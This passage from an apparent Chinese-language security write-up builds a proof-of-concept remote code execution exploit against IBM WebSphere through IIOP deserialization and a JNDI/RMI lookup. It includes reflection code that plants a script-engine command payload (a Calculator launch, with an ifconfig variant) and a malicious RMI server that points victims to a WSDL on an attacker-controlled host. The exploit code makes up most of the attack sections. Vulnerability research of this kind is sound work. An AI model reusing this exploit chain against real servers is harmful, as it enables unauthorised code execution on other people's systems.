所以还需要构造`HomeInternal`的具体实现对象，并使其返回`String`类型。
整理一下需要构造的`HomeInternal`对象的需求：
  * 构造`J2EEName`对象，满足要求
  * 寻找一个`HomeInternal`的具体实现对象，其`getJNDIName`方法返回`String`，且返回不受到`pkey`干扰
查看继承树后，发现`EJSHome`抽象类满足要求：
所以梳理一下思路：
  * 实例化`EJSHome`接口实现类
  * 实例化`J2EEName`对象
  * 反射设置`J2EEName`到`EJSHome`接口实现类
  * 反射设置`EJSHome`接口实现类 的`this.jndiName`变量为RMI Server的地址
  * 实例化`BeanId`
  * 实例化`BeanMetaData`
  * 实例化`Properties`
这里重写了`com.ibm.ejs.container.EJSWrapper`：
    public Handle getHandle() {
        Handle var2 = null;
        try {
            SessionHome sessionHome = new SessionHome();
            J2EEName j2EEName = new J2EENameImpl("aa","aa","aa");
            Field j2eeName = EJSHome.class.getDeclaredField("j2eeName");
            j2eeName.setAccessible(true);
            j2eeName.set(sessionHome,j2EEName);
            Field jndiName = sessionHome.getClass().getSuperclass().getDeclaredField("jndiName");
            jndiName.setAccessible(true);
            jndiName.set(sessionHome,"rmi://127.0.0.1:1099/poc");
            Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('open /Applications/Calculator.app')\")";
            //Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"ifconfig\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")";
            BeanId beanId = new BeanId(sessionHome,key,true);
            BeanMetaData beanMetaData = new BeanMetaData(1);
            beanMetaData.homeInterfaceClass = com.ibm.ws.batch.CounterHome.class;
            Properties initProperties = new Properties();
            initProperties.setProperty("java.naming.factory.object", "org.apache.wsif.naming.WSIFServiceObjectFactory");
            Constructor c = EntityHandle.class.getDeclaredConstructor(BeanId.class, BeanMetaData.class, Properties.class);
            c.setAccessible(true);
            var2 = (Handle) c.newInstance(beanId, beanMetaData, initProperties);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return var2;
    }
## 3.3 构造RMI Server绑定
根据2.2.2的分析，我们最终的RMI流程会进行到`org.apache.wsif.naming.WSIFServiceObjectFactory`中：
所以我们需要构造一个恶意的RMI Server，其应该满足以下要求：
  * 返回一个`WSIFServiceStubRef`对象
  * 指定用于后续调用`WSIF`流程的基础参数：
    * `wsdLoc`
    * `serviceNS`
    * `serviceName`
    * `portTypeNS`
    * `portTypeName`
    * `preferredPort`
  * 设置`className`为`com.ibm.ws.batch.CounterHome`
以上有关`WSIF`的参数设置，可以参考2.2.1中的叙述，这里就不再过多重复了。
最终可以构造RMI Server如下：
    public class RmiServer {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.createRegistry(1097);
            Reference ref = new Reference(WSIFServiceObjectFactory.class.getName(), null, null);
            ref.add(new StringRefAddr("wsdlLoc", "http://192.168.211.1:9999/poc.wsdl"));
            ref.add(new StringRefAddr("serviceNS", null));
            ref.add(new StringRefAddr("serviceName", null));
            ref.add(new StringRefAddr("portTypeNS", "http://wsifservice.addressbook/"));
            ref.add(new StringRefAddr("portTypeName", "Gadget"));
            ref.add(new StringRefAddr("className", "com.ibm.ws.batch.CounterHome"));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
            registry.bind("poc", referenceWrapper);
        }
    }
## 3.4 构造WSDL文件
这一部分参考2.2.1中叙述，这里直接给出`wsdl`文件的内容：
## 3.5 整合poc
最后将3.2构造好的`WSIFPort_EJB`序列化对象写入3.1构造好的IIOP请求中：
至此poc构造完毕。
攻击效果如下：
# 0x04 参考
  * 
  * 
  * 
  * 
  * 
  * 
  * 
* * *